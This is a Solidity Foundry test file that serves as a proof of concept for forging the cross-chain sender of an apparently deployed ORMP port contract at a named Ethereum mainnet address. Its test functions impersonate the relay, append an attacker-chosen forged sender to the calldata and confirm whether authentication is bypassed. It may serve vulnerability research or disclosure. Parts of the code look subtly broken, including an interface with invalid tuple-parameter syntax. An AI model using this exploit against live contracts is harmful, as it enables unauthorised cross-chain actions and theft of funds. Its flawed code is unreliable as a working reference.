// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// Matches actual ORMPUpgradeablePort.recv() signature
interface IORMPPort {
    function recv(
        address fromDapp,
        address toDapp,
        bytes calldata message
    ) external payable;
}

// Matches actual ORMP.recv() signature (the relay entry point)
interface IORMP {
    function recv(
        (
            address channel,
            uint256 index,
            uint256 fromChainId,
            address from,
            uint256 toChainId,
            address to,
            uint256 gasLimit,
            bytes memory encoded
        ) calldata message,
        bytes calldata proof
    ) external;
}

// Captures whether _xmsgSender() resolved to our forged address
contract SenderCapture {
    address public captured;
    bool public wasCalled;

    fallback(bytes calldata data) external payable
    returns (bytes memory) {
        wasCalled = true;
        // Extract last 20 bytes — what _xmsgSender() would read
        if (data.length >= 20) {
            bytes memory d = data;
            assembly {
                let ptr := add(d, mload(d))
                captured := shr(96, mload(ptr))
            }
        }
        return "";
    }

    receive() external payable {}
}

contract XmsgSenderForgeTest is Test {

    // ORMPUpgradeablePort on ETH mainnet
    address constant TARGET =
        0x2cd1867Fb8016f93710B6386f7f9F1D540A60812;
    
    // ORMP relay (msg.sender that passes onlyORMP)
    address constant RELAY =
        0x13b2211a7cA45Db2808F6dB05557ce5347e3634e;
    
    // Registered peer for Arbitrum (chainId 42161)
    address constant PEER =
        0x2cd1867Fb8016f93710B6386f7f9F1D540A60812;
    
    // Attacker-chosen forged sender
    address constant FORGED_SENDER =
        0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF;
    
    uint256 constant FROM_CHAIN = 42161;

    function testPayloadAlignment() public pure {
        // Verify ORMP appends: fromChainId (32 bytes) + sender (20 bytes)
        bytes memory suffix = abi.encodePacked(
            uint256(FROM_CHAIN),
            bytes20(PEER)
        );
        assertEq(suffix.length, 52);
    }

    function testForge_SenderExtraction() public {
        SenderCapture c = new SenderCapture();

        // Craft message payload
        // ORMP relay appends: abi.encode(fromChainId) + bytes20(message.from)
        // _xmsgSender() reads: shr(96, calldataload(calldatasize() - 20))
        // So last 20 bytes of full calldata = message.from
        
        // Build the inner message bytes that PORT.recv() receives
        // The relay calls: port.recv(fromDapp, toDapp, encoded)
        // Then appends fromChainId + message.from to calldata
        
        bytes memory encoded = hex"";

        // Simulate relay calling recv() with forged sender appended
        bytes memory calldataPayload = abi.encodeWithSelector(
            IORMPPort.recv.selector,
            FORGED_SENDER,    // fromDapp (attacker chosen)
            address(c),       // toDapp (our capture contract)
            encoded
        );

        // Append the suffix that relay would add:
        // last 20 bytes = message.from = FORGED_SENDER
        bytes memory fullCalldata = bytes.concat(
            calldataPayload,
            abi.encode(uint256(FROM_CHAIN)),  // 32 bytes chainId
            bytes20(FORGED_SENDER)            // 20 bytes forged sender
        );

        vm.prank(RELAY);
        (bool ok,) = TARGET.call(fullCalldata);

        console.log("recv() succeeded:", ok);
        console.log("toDapp called:", c.wasCalled());
        console.log("captured sender:", c.captured);
        console.log("forged sender:", FORGED_SENDER);

        if (c.captured == FORGED_SENDER) {
            console.log("[CRITICAL CONFIRMED] _xmsgSender forged");
        }
    }

    function testForge_ORMPPort_v13() public {
        SenderCapture c = new SenderCapture();

        bytes memory payload = bytes.concat(
            bytes12(0),
            bytes32(uint256(FROM_CHAIN)),
            bytes20(PEER)
        );

        bytes memory callData = abi.encodeWithSelector(
            IORMPPort.recv.selector,
            address(0xdead),
            address(c),
            payload
        );

        // Append forged sender suffix
        bytes memory fullCalldata = bytes.concat(
            callData,
            bytes20(FORGED_SENDER)
        );

        vm.prank(RELAY);
        (bool ok,) = TARGET.call(fullCalldata);

        console.log("recv() ok:", ok);
        console.log("captured:", c.captured);
    }
}